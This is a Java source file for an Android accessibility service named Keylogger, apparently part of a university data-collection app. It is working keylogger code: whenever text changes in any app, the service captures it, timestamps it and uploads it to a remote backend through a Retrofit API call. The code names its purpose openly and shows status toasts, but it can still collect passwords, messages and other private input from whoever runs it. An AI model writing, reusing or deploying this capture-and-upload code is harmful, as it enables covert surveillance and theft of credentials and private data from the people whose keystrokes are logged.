package ca.uqac.bigdataetmoi.workers;


import android.accessibilityservice.AccessibilityService;
import android.os.AsyncTask;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.widget.Toast;

import com.google.gson.JsonObject;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;
import java.util.Locale;

import ca.uqac.bigdataetmoi.dto.KeyloggerDto;
import ca.uqac.bigdataetmoi.models.User;
import ca.uqac.bigdataetmoi.services.HttpClient;
import ca.uqac.bigdataetmoi.services.UserService;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import timber.log.Timber;


public class Keylogger extends AccessibilityService {

    ca.uqac.bigdataetmoi.models.Keylogger userInputs;
    public String currentTime;

    private class SendToServerTask extends AsyncTask<String, Void, String> {


        @Override
        protected String doInBackground(String... params) {

            try {
                JsonObject json = new JsonObject();
                json.addProperty("texting", params[0]);
                currentTime = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss").format(new java.util.Date());

                userInputs = new ca.uqac.bigdataetmoi.models.Keylogger(params[0], currentTime);

                sendKeyloggerRequest(userInputs.logged, userInputs.datetime);

            } catch (Exception e) {
                e.printStackTrace();
            }
            return params[0];
        }
    }

    private void sendKeyloggerRequest(String userInputs, String currentTime) {
        List<KeyloggerDto> keyloggerList = new ArrayList<>();

        KeyloggerDto keyloggerDto = new KeyloggerDto(userInputs, currentTime);
        keyloggerList.add(keyloggerDto);

        Call<User> keyloggerCall = new HttpClient<UserService>(this).create(UserService.class).sendKeyloggerList(keyloggerList);

        keyloggerCall.enqueue(new Callback<User>() {
            @Override
            public void onResponse(Call<User> call, Response<User> response) {
                handleRegisterResponse(response);
            }

            @Override
            public void onFailure(Call<User> call, Throwable t) {
                handleRegisterFailure(t);
            }
        });
    }

    private void handleRegisterResponse(Response<User> response) {
        if (response.isSuccessful()) {
            Toast.makeText(getApplicationContext(), "Keylogger enregistré avec succès.", Toast.LENGTH_SHORT).show();
        } else {
            Toast.makeText(getApplicationContext(), "Une erreur a été rencontré .", Toast.LENGTH_SHORT).show();
        }
    }


    private void handleRegisterFailure(Throwable t) {
        Toast.makeText(getApplicationContext(), "Erreur lors de la tentative de keylogger", Toast.LENGTH_SHORT).show();
        Timber.e(t);
    }

    @Override
    public void onServiceConnected() {
        Log.d("Keylogger", "Starting service");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

        DateFormat df = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.FRANCE);
        String time = df.format(Calendar.getInstance().getTime());

        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                String data = event.getText().toString();
                int left = data.indexOf("[");

                int right = data.indexOf("]");
                String parsedata = data.substring(left + 1, right);


                SendToServerTask sendTask = new SendToServerTask();

                sendTask.execute(time + ", TEXT :" + parsedata);

                currentTime = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss").format(new java.util.Date());

                ca.uqac.bigdataetmoi.models.Keylogger user = new ca.uqac.bigdataetmoi.models.Keylogger(parsedata, currentTime);
                user.setlogged(parsedata);
                break;
            }
            default:
                break;
        }
    }

    @Override
    public void onInterrupt() {

    }


}
